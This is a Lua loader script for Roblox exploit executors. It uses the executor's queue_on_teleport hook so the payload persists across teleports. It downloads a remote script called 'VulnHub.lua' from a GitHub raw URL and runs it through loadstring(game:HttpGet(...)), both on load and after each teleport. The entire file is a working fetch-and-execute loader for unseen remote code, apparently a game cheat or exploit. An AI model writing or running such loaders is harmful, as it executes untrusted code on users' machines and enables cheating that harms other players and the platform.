local queueFunction = syn and syn.queue_on_teleport or queue_on_teleport or flux and flux.queue_on_teleport

if queueFunction then
    queueFunction([[
        task.spawn(function()
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            task.wait(2)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/VulnHub.lua"))()
        end)
    ]])
end

task.spawn(function()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    loadstring(game:HttpGet("https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/VulnHub.lua"))()
end)
